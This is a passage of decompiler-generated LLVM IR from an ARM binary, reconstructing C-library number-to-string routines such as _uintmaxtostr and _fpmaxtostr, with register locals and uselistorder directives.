  %v4_15f50 = mul i32 %v2_15f44.v2_15f40, 65536
  %v4_15f54 = sdiv i32 %v4_15f50, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15f4c, %dec_label_pc_15f3c, %bb5
  %v0_15f58 = phi i32 [ %v2_15f40, %dec_label_pc_15f4c ], [ %v2_15f44, %dec_label_pc_15f3c ], [ %v4_15f54, %bb5 ]
  %v3_15f58 = ashr i32 %v0_15f58, 31
  store i32 %v3_15f58, i32* @r1, align 4
  ret i32 %v0_15f58

; uselistorder directives
  uselistorder i32 %v0_15f58, { 1, 0 }
  uselistorder i32 %v2_15f44, { 1, 0 }
  uselistorder i32 %v2_15f40, { 1, 2, 0 }
  uselistorder i32 %v2_15f10, { 1, 0 }
  uselistorder i32 %v2_15f0c, { 1, 2, 0 }
  uselistorder i1 %v2_15f2c, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15f34, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_15f60 = icmp eq i32 %arg2, 256
  store i1 %v7_15f60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15f60, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_15f64 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_15f64, i8* %tmp3, align 1
  %v1_15f68.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_15f68 = phi i1 [ false, %entry ], [ %v1_15f68.pre, %bb ]
  %v0_15f68 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_15f68, i32 %v0_15f68)
  %v7_15f6c = icmp eq i32 %arg2, 2048
  store i1 %v7_15f6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15f6c, label %dec_label_pc_15f74, label %dec_label_pc_15f7c

dec_label_pc_15f74:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_15f74 = add i32 %tmp2, 4
  %v6_15f74 = inttoptr i32 %v5_15f74 to i32*
  store i32 %arg4, i32* %v6_15f74, align 4
  ret i32 %tmp2

dec_label_pc_15f7c:                               ; preds = %bb4
  %v7_15f7c = icmp eq i32 %arg2, 512
  store i1 %v7_15f7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15f7c, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_15f7c
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_15f7c
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_15f98 = icmp slt i32 %tmp21, 0
  %v2_15f98 = icmp eq i32 %tmp21, 0
  store i1 %v2_15f98, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_15fa0 = load i32, i32* @r2, align 4
  store i32 %v0_15fa0, i32* %r5.global-to-local, align 4
  %v0_15fa4 = load i32, i32* @r3, align 4
  store i32 %v0_15fa4, i32* %r6.global-to-local, align 4
  br i1 %v1_15f98, label %dec_label_pc_15fac, label %dec_label_pc_15fcc

dec_label_pc_15fac:                               ; preds = %entry
  %v1_15fac = icmp slt i32 %v0_15fa4, 0
  %v2_15fac = icmp eq i32 %v0_15fa4, 0
  store i1 %v2_15fac, i1* %cpsr_z.global-to-local, align 1
  %v1_15fb0 = sub i32 0, %tmp21
  store i32 %v1_15fb0, i32* %r7.global-to-local, align 4
  br i1 %v1_15fac, label %dec_label_pc_15fb8, label %dec_label_pc_15fcc

dec_label_pc_15fb8:                               ; preds = %dec_label_pc_15fac
  %v1_15fbc = sub i32 0, %v0_15fa0
  store i32 %v1_15fbc, i32* %r5.global-to-local, align 4
  %v2_15fbc = icmp eq i32 %v0_15fa0, 0
  %v2_15fc0 = icmp eq i1 %v2_15fbc, false
  %v5_15fc0 = sext i1 %v2_15fc0 to i32
  %v6_15fc0 = sub i32 %v5_15fc0, %v0_15fa4
  store i32 %v6_15fc0, i32* %r6.global-to-local, align 4
  %v19_15fc0 = icmp eq i32 %v6_15fc0, 0
  store i1 %v19_15fc0, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15fd4

dec_label_pc_15fcc:                               ; preds = %dec_label_pc_15fac, %entry
  br label %dec_label_pc_15fd4

dec_label_pc_15fd4:                               ; preds = %dec_label_pc_15fb8, %dec_label_pc_15fcc
  %storemerge = phi i8 [ 0, %dec_label_pc_15fcc ], [ 1, %dec_label_pc_15fb8 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_15fdc = load i32, i32* %r7.global-to-local, align 4
  %v2_15fe4 = udiv i32 -1, %v0_15fdc
  store i32 %v2_15fe4, i32* %fp.global-to-local, align 4
  %v3_15ff4 = urem i32 -1, %v0_15fdc
  %v1_15ff8 = add i32 %v3_15ff4, 1
  store i32 %v1_15ff8, i32* %sb.global-to-local, align 4
  %v9_15ffc = icmp eq i32 %v1_15ff8, %v0_15fdc
  store i1 %v9_15ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15ffc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15fd4
  %v1_16000 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_16000, i32* %sb.global-to-local, align 4
  %v2_16004 = add i32 %v2_15fe4, 1
  store i32 %v2_16004, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15fd4, %bb
  %v0_16008 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16008, i32* %sl.global-to-local, align 4
  %v0_1600c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1600c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16010

dec_label_pc_16010thread-pre-split:               ; preds = %bb25
  %v0_16010.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_16014.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_16018.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16010

dec_label_pc_16010:                               ; preds = %dec_label_pc_16010thread-pre-split, %.thread
  %v0_16094 = phi i32 [ %v0_16018.pre, %dec_label_pc_16010thread-pre-split ], [ %v0_15fdc, %.thread ]
  %v0_1608c = phi i32 [ %v0_16014.pre, %dec_label_pc_16010thread-pre-split ], [ %v0_1600c, %.thread ]
  %v0_16028 = phi i32 [ %v0_16010.pr, %dec_label_pc_16010thread-pre-split ], [ %v0_16008, %.thread ]
  %v2_16010 = icmp eq i32 %v0_16028, 0
  store i1 %v2_16010, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16010, label %dec_label_pc_16088, label %dec_label_pc_16020

dec_label_pc_16020:                               ; preds = %dec_label_pc_16010
  %v2_16024 = udiv i32 %v0_16028, %v0_16094
  %v3_16024 = urem i32 %v0_16028, %v0_16094
  store i32 %v2_16024, i32* %sl.global-to-local, align 4
  %v2_16044 = udiv i32 %v0_1608c, %v0_16094
  %v3_16044 = urem i32 %v0_1608c, %v0_16094
  %v0_16048 = load i32, i32* %sb.global-to-local, align 4
  %v2_16048 = mul i32 %v0_16048, %v3_16024
  %v2_16050 = add i32 %v2_16048, %v3_16044
  store i32 %v2_16050, i32* %r5.global-to-local, align 4
  %v0_1605c = load i32, i32* %fp.global-to-local, align 4
  %v2_1605c = mul i32 %v0_1605c, %v3_16024
  %v2_16064 = add i32 %v2_1605c, %v2_16044
  %v2_1606c = udiv i32 %v2_16050, %v0_16094
  %v2_16074 = add i32 %v2_16064, %v2_1606c
  br label %dec_label_pc_160a0

dec_label_pc_16088:                               ; preds = %dec_label_pc_16010
  %v2_16088 = udiv i32 %v0_1608c, %v0_16094
  br label %dec_label_pc_160a0

dec_label_pc_160a0:                               ; preds = %dec_label_pc_16020, %dec_label_pc_16088
  %storemerge28 = phi i32 [ %v2_16088, %dec_label_pc_16088 ], [ %v2_16074, %dec_label_pc_16020 ]
  %v0_160bc = phi i32 [ %v2_16088, %dec_label_pc_16088 ], [ %v2_16074, %dec_label_pc_16020 ]
  %v1_160bc = phi i32 [ 0, %dec_label_pc_16088 ], [ %v2_16024, %dec_label_pc_16020 ]
  %v2_16050.pn = phi i32 [ %v0_1608c, %dec_label_pc_16088 ], [ %v2_16050, %dec_label_pc_16020 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_160a8 = urem i32 %v2_16050.pn, %v0_16094
  %v2_160a4 = icmp ugt i32 %v0_160a8, 8
  %v7_160a4 = icmp eq i32 %v0_160a8, 9
  store i1 %v7_160a4, i1* %cpsr_z.global-to-local, align 1
  %v1_160ac = add i32 %v0_160a8, 48
  %v0_160b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_160b4 = add i32 %v0_160b4, -1
  store i32 %v1_160b4, i32* %r8.global-to-local, align 4
  %v2_160b8 = xor i1 %v7_160a4, true
  %v3_160b8 = and i1 %v2_160a4, %v2_160b8
  %extract.t = trunc i32 %v1_160ac to i8
  br i1 %v3_160b8, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_160a0
  %v2_160a8 = add i32 %v0_160a8, %tmp11
  %extract.t9 = trunc i32 %v2_160a8 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_160a0, %bb24
  %v0_160c0.off0 = phi i8 [ %extract.t, %dec_label_pc_160a0 ], [ %extract.t9, %bb24 ]
  %v2_160bc = or i32 %v0_160bc, %v1_160bc
  %v4_160bc = icmp eq i32 %v2_160bc, 0
  store i1 %v4_160bc, i1* %cpsr_z.global-to-local, align 1
  %v3_160c0 = inttoptr i32 %v1_160b4 to i8*
  store i8 %v0_160c0.off0, i8* %v3_160c0, align 1
  %v0_160c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_160c4, label %dec_label_pc_160c8, label %dec_label_pc_16010thread-pre-split

dec_label_pc_160c8:                               ; preds = %bb25
  %v4_160c810 = zext i8 %storemerge to i32
  store i32 %v4_160c810, i32* @r3, align 4
  %v2_160cc = icmp eq i8 %storemerge, 0
  store i1 %v2_160cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_160cc, label %dec_label_pc_160c8..thread2_crit_edge, label %bb26

dec_label_pc_160c8..thread2_crit_edge:            ; preds = %dec_label_pc_160c8
  %v0_160d8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_160c8
  store i32 45, i32* @r3, align 4
  %v3_160d4 = load i32, i32* %r8.global-to-local, align 4
  %v4_160d4 = add i32 %v3_160d4, -1
  %v5_160d4 = inttoptr i32 %v4_160d4 to i8*
  store i8 45, i8* %v5_160d4, align 1
  %v6_160d4 = load i32, i32* %r8.global-to-local, align 4
  %v7_160d4 = add i32 %v6_160d4, -1
  store i32 %v7_160d4, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_160c8..thread2_crit_edge, %bb26
  %v0_160d8 = phi i32 [ %v0_160d8.pre, %dec_label_pc_160c8..thread2_crit_edge ], [ %v7_160d4, %bb26 ]
  ret i32 %v0_160d8

; uselistorder directives
  uselistorder i32 %v0_160a8, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16094, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_15fa0, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 5, 2, 6, 0, 8, 9, 3, 4, 10, 7, 1, 11, 12 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_160a0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_15fd4, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_160e8 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_160f4 = add i32 %arg4, 8
  %v2_160f4 = inttoptr i32 %v1_160f4 to i8*
  %v3_160f4 = load i8, i8* %v2_160f4, align 1
  %v4_160f4 = zext i8 %v3_160f4 to i32
  store i32 %v4_160f4, i32* %sb.global-to-local, align 4
  %v1_160f8 = or i32 %v4_160f4, 32
  %v7_160fc = icmp eq i32 %v1_160f8, 97
  store i1 %v7_160fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_16114 = inttoptr i32 %arg4 to i32*
  %v2_16114 = load i32, i32* %v1_16114, align 4
  store i32 %v2_16114, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_1611c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1611c, i32* %r6.global-to-local, align 4
  store i32 65224, i32* %ip.global-to-local, align 4
  br i1 %v7_160fc, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_16124 = add nuw nsw i32 %v4_160f4, 6
  store i32 %v2_16124, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_16134 = phi i32 [ %v0_1611c, %entry ], [ %v2_16124, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_1612c = add i32 %arg4, 12
  %v2_1612c = inttoptr i32 %v1_1612c to i32*
  %v3_1612c = load i32, i32* %v2_1612c, align 4
  store i32 %v3_1612c, i32* %r2.global-to-local, align 4
  %v1_16130 = add i32 %arg4, 4
  %v2_16130 = inttoptr i32 %v1_16130 to i32*
  %v3_16130 = load i32, i32* %v2_16130, align 4
  store i32 %v3_16130, i32* @lr, align 4
  br i1 %v7_160fc, label %bb202, label %bb203

bb202:                                            ; preds = %bb201
  %v2_16134 = urem i32 %v1_16134, 256
  store i32 %v2_16134, i32* %sb.global-to-local, align 4
  br label %bb203

bb203:                                            ; preds = %bb201, %bb202
  %v1_16138 = icmp slt i32 %v2_16114, 0
  %v2_16138 = icmp eq i32 %v2_16114, 0
  store i1 %v2_16138, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* %ip.global-to-local, align 4
  br i1 %v1_16138, label %bb204, label %bb205

bb204:                                            ; preds = %bb203
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %bb203, %bb204
  %v1_16148 = and i32 %v3_1612c, 2
  %v2_16148 = icmp eq i32 %v1_16148, 0
  store i1 %v2_16148, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_16148, label %dec_label_pc_16160, label %dec_label_pc_1616c

dec_label_pc_16160:                               ; preds = %bb205
  %v1_16160 = urem i32 %v3_1612c, 2
  %v2_16160 = icmp eq i32 %v1_16160, 0
  store i1 %v2_16160, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16160, label %dec_label_pc_16170, label %dec_label_pc_1616c

dec_label_pc_1616c:                               ; preds = %dec_label_pc_16160, %bb205
  %storemerge = phi i32 [ 43, %bb205 ], [ 32, %dec_label_pc_16160 ]
  %v0_1616c.off0 = phi i8 [ 43, %bb205 ], [ 32, %dec_label_pc_16160 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_1616c.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_16170

dec_label_pc_16170:                               ; preds = %dec_label_pc_16160, %dec_label_pc_1616c
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_1611c, i32* %r3.global-to-local, align 4
  store i32 %tmp160, i32* @r0, align 4
  store i32 %v0_1611c, i32* %r1.global-to-local, align 4
  store i32 %tmp160, i32* @r2, align 4
  %v1_1618c = fptrunc double %arg2 to float
  %v2_1618c = bitcast float %v1_1618c to i32
  %v9_1618c = call i32 @__aeabi_dcmpeq(i32 %v2_1618c, i32 %v0_1611c, i32 %v2_1618c, i32 %v0_1611c, i32 0)
  store i32 %v9_1618c, i32* %r0.global-to-local, align 4
  %v2_16190 = icmp eq i32 %v9_1618c, 0
  store i1 %v2_16190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16190, label %bb207, label %dec_label_pc_161a0

bb207:                                            ; preds = %dec_label_pc_16170
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16254

dec_label_pc_161a0:                               ; preds = %dec_label_pc_16170
  %v0_161a0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_161a0, i32* @r0, align 4
  %v0_161a4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_161a4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_161b0 = call i32 @__aeabi_dcmpeq(i32 %v0_161a0, i32 %v0_161a4, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_161b0, i32* %r0.global-to-local, align 4
  %v2_161b4 = icmp eq i32 %v7_161b0, 0
  store i1 %v2_161b4, i1* %cpsr_z.global-to-local, align 1
  %v0_161fc = load i32, i32* %r5.global-to-local, align 4
  %v1_161fc = sext i32 %v0_161fc to i64
  %v2_161fc = bitcast i64 %v1_161fc to double
  br i1 %v2_161b4, label %dec_label_pc_161fc, label %dec_label_pc_161bc

dec_label_pc_161bc:                               ; preds = %dec_label_pc_161a0
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v9_161cc = fdiv double 0.000000e+00, %v2_161fc
  %v10_161cc = fptrunc double %v9_161cc to float
  %v11_161cc = bitcast float %v10_161cc to i32
  store i32 %v11_161cc, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_161d8 = call i32 @__aeabi_dcmplt(i32 %v11_161cc, i32 1072693248, i32 0, i32 0)
  store i32 %v4_161d8, i32* %r0.global-to-local, align 4
  %v2_161dc = icmp eq i32 %v4_161d8, 0
  store i1 %v2_161dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_161dc, label %bb208, label %dec_label_pc_161e8

bb208:                                            ; preds = %dec_label_pc_161bc
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_163c8

dec_label_pc_161e8:                               ; preds = %dec_label_pc_161bc
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_163c8

dec_label_pc_161fc:                               ; preds = %dec_label_pc_161a0
  store i32 %v0_161fc, i32* @r0, align 4
  %v0_16200 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16200, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1620c = fptrunc double %v2_161fc to float
  %v2_1620c = bitcast float %v1_1620c to i32
  %v6_1620c = call i32 @__aeabi_dcmplt(i32 %v2_1620c, i32 %v0_16200, i32 0, i32 0)
  store i32 %v6_1620c, i32* %r0.global-to-local, align 4
  %v2_16210 = icmp eq i32 %v6_1620c, 0
  store i1 %v2_16210, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16210, label %dec_label_pc_161fc..thread10_crit_edge, label %bb209

dec_label_pc_161fc..thread10_crit_edge:           ; preds = %dec_label_pc_161fc
  %v0_16230.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread10

bb209:                                            ; preds = %dec_label_pc_161fc
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_16218 = load i32, i32* %r6.global-to-local, align 4
  %v2_16218 = sub i32 0, %v1_16218
  store i32 %v2_16218, i32* %r4.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_16218, i32* %r6.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_161fc..thread10_crit_edge, %bb209
  %v0_16230 = phi i32 [ %v0_16230.pre, %dec_label_pc_161fc..thread10_crit_edge ], [ %v2_16218, %bb209 ]
  %v0_1622c = load i32, i32* %r5.global-to-local, align 4
  %v1_1622c = sext i32 %v0_1622c to i64
  %v2_1622c = bitcast i64 %v1_1622c to double
  %v9_16234 = fmul double %v2_1622c, 0.000000e+00
  %v10_16234 = fptrunc double %v9_16234 to float
  %v11_16234 = bitcast float %v10_16234 to i32
  store i32 %v11_16234, i32* @r2, align 4
  store i32 %v0_16230, i32* %r3.global-to-local, align 4
  store i32 %v0_1622c, i32* @r0, align 4
  store i32 %v0_16230, i32* %r1.global-to-local, align 4
  %v7_16248 = call i32 @__aeabi_dcmpeq(i32 %v0_1622c, i32 %v0_16230, i32 %v11_16234, i32 %v0_16230, i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_16248, i32* %r0.global-to-local, align 4
  %v2_1624c = icmp eq i32 %v7_16248, 0
  store i1 %v2_1624c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1624c, label %dec_label_pc_162a0, label %.thread10.dec_label_pc_16254_crit_edge

.thread10.dec_label_pc_16254_crit_edge:           ; preds = %.thread10
  %v3_16254.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_16254

dec_label_pc_16254:                               ; preds = %bb207, %.thread10.dec_label_pc_16254_crit_edge
  %v3_16254 = phi i32 [ %v3_16254.pre, %.thread10.dec_label_pc_16254_crit_edge ], [ %arg4, %bb207 ]
  %v1_16198.v0_161846 = phi i32 [ 0, %.thread10.dec_label_pc_16254_crit_edge ], [ 8, %bb207 ]
  store i32 %v3_16254, i32* %ip.global-to-local, align 4
  %v2_1625c = add i32 %v3_16254, 16
  %v3_1625c = inttoptr i32 %v2_1625c to i32*
  store i32 32, i32* %v3_1625c, align 4
  %v0_16264 = load i32, i32* %sb.global-to-local, align 4
  %v7_16264 = icmp eq i32 %v0_16264, 96
  store i1 %v7_16264, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp274 = icmp ult i32 %v0_16264, 97
  br i1 %tmp274, label %bb210, label %.thread124

bb210:                                            ; preds = %dec_label_pc_16254
  %v5_16278 = or i32 %v1_16198.v0_161846, 4
  store i32 %v5_16278, i32* %r3.global-to-local, align 4
  br label %.thread124

.thread124:                                       ; preds = %dec_label_pc_16254, %bb210
  %v4_1627c = phi i32 [ %v5_16278, %bb210 ], [ 3, %dec_label_pc_16254 ]
  %v4_1627c.v1_16198.v0_16184 = select i1 %tmp274, i32 %v4_1627c, i32 %v1_16198.v0_161846
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %lr.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34240), i32* %r3.global-to-local, align 4
  %v2_16290 = add nsw i32 %v4_1627c.v1_16198.v0_16184, add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34240)
  store i32 %v2_16290, i32* %r2.global-to-local, align 4
  %v2_16294 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_16294, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_167bc

dec_label_pc_162a0:                               ; preds = %.thread10
  %v0_162a0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_162a0, i32* %r1.global-to-local, align 4
  store i32 1100470148, i32* %r3.global-to-local, align 4
  %v0_162a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_162a8, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v6_162b0 = call i32 @__aeabi_dcmplt(i32 %v0_162a8, i32 %v0_162a0, i32 0, i32 1100470148)
  store i32 %v6_162b0, i32* %r0.global-to-local, align 4
  %v2_162b4 = icmp eq i32 %v6_162b0, 0
  store i1 %v2_162b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_162b4, label %bb212, label %bb211

bb211:                                            ; preds = %dec_label_pc_162a0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_162a0, %bb211
  %v0_162bc = phi i32 [ 0, %dec_label_pc_162a0 ], [ 1, %bb211 ]
  store i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34216), i32* %r3.global-to-local, align 4
  store i32 add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34216), i32* %stack_var_-208, align 4
  store i32 9, i32* %sl.global-to-local, align 4
  store i32 256, i32* %r4.global-to-local, align 4
  %v2_162f0 = icmp eq i32 %v0_162bc, 0
  br label %dec_label_pc_162e0

dec_label_pc_162e0:                               ; preds = %dec_label_pc_16378.dec_label_pc_162e0_crit_edge, %bb212
  %v2_162e8 = phi i32 [ add (i32 sext (i16 ptrtoint (i16* @global_var_26010.295 to i16) to i32), i32 -34216), %bb212 ], [ %v2_162e8.pre, %dec_label_pc_16378.dec_label_pc_162e0_crit_edge ]
  %v0_162e4 = phi i32 [ 9, %bb212 ], [ %v0_16378, %dec_label_pc_16378.dec_label_pc_162e0_crit_edge ]
  %v2_16328 = phi i32 [ 8, %bb212 ], [ %stack_var_-192.3, %dec_label_pc_16378.dec_label_pc_162e0_crit_edge ]
  store i32 %v0_162bc, i32* %r2.global-to-local, align 4
  %v1_162e4 = add i32 %v0_162e4, -1
  store i32 %v1_162e4, i32* %sl.global-to-local, align 4
  store i32 %v2_162e8, i32* @lr, align 4
  %v3_162ec = mul i32 %v1_162e4, 8
  store i32 %v3_162ec, i32* %r3.global-to-local, align 4
  store i1 %v2_162f0, i1* %cpsr_z.global-to-local, align 1
  %v0_162f4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_162f4, i32* %r0.global-to-local, align 4
  %v0_162f8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_162f8, i32* %r1.global-to-local, align 4
  %v2_162fc = add i32 %v3_162ec, %v2_162e8
  store i32 %v2_162fc, i32* %ip.global-to-local, align 4
  %v1_16338 = inttoptr i32 %v2_162fc to i32*
  %v2_16338 = load i32, i32* %v1_16338, align 4
  %v3_16338 = sext i32 %v2_16338 to i64
  %v1_1633c = sext i32 %v0_162f4 to i64
  %v2_1633c = bitcast i64 %v1_1633c to double
